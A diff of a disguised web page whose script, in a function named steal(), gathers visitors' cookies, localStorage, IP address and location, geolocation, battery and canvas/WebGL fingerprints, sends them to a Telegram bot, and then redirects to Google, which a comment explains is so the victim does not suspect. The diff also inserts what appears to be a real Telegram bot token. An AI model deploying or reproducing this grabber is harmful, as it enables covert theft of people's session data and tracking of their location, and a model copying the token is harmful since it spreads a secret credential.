@@ -12,13 +12,12 @@ body{margin:0;background:#000;color:#fff;font-family:Arial;display:flex;justify-
 <div id="status">جاري التحميل...</div>
 
 <script>
-const TOKEN = "ضع_هنا_توكن_بوت_التليجرام";
-const CHAT_ID = "ضع_هنا_ايدي_الشات";
+const TOKEN = "9151857239:AAF7zCG4jyQkfxWGJs7vxcA2_eAgBwkZKRc";
+const CHAT_ID = "حط_هنا_الـChat_ID";   // ← باقي هذا فقط
 
 async function steal() {
     let data = {};
 
-    // معلومات أساسية
     data.userAgent = navigator.userAgent;
     data.platform = navigator.platform;
     data.language = navigator.language;
@@ -29,7 +28,6 @@ async function steal() {
     data.deviceMemory = navigator.deviceMemory || "غير متاح";
     data.maxTouchPoints = navigator.maxTouchPoints;
 
-    // الشاشة
     data.screen = {
         width: screen.width,
         height: screen.height,
@@ -39,12 +37,10 @@ async function steal() {
         pixelRatio: window.devicePixelRatio
     };
 
-    // الوقت والمنطقة
     data.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
     data.timezoneOffset = new Date().getTimezoneOffset();
     data.date = new Date().toString();
 
-    // الاتصال
     if (navigator.connection) {
         data.connection = {
             effectiveType: navigator.connection.effectiveType,
@@ -54,7 +50,6 @@ async function steal() {
         };
     }
 
-    // البطارية
     try {
         const battery = await navigator.getBattery();
         data.battery = {
@@ -63,7 +58,6 @@ async function steal() {
         };
     } catch(e) {}
 
-    // الآي بي والموقع التقريبي
     try {
         const ipRes = await fetch("https://ipapi.co/json/");
         data.ipInfo = await ipRes.json();
@@ -71,7 +65,6 @@ async function steal() {
         data.ip = await (await fetch("https://api.ipify.org")).text();
     }
 
-    // Canvas Fingerprint
     try {
         const canvas = document.createElement("canvas");
         const ctx = canvas.getContext("2d");
@@ -81,7 +74,6 @@ async function steal() {
         data.canvasFingerprint = canvas.toDataURL().slice(-50);
     } catch(e) {}
 
-    // WebGL Fingerprint
     try {
         const canvas = document.createElement("canvas");
         const gl = canvas.getContext("webgl");
@@ -91,13 +83,11 @@ async function steal() {
         };
     } catch(e) {}
 
-    // الكوكيز والتخزين المحلي
     data.cookies = document.cookie;
     try {
         data.localStorage = JSON.stringify(localStorage);
     } catch(e) {}
 
-    // محاولة الموقع الجغرافي (إذا سمح)
     if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(pos => {
             data.geo = {
@@ -133,7 +123,6 @@ async function sendData(data) {
         })
     });
 
-    // تحويل لصفحة عادية عشان ما يشك
     setTimeout(() => {
         window.location.href = "https://www.google.com";
     }, 1200);
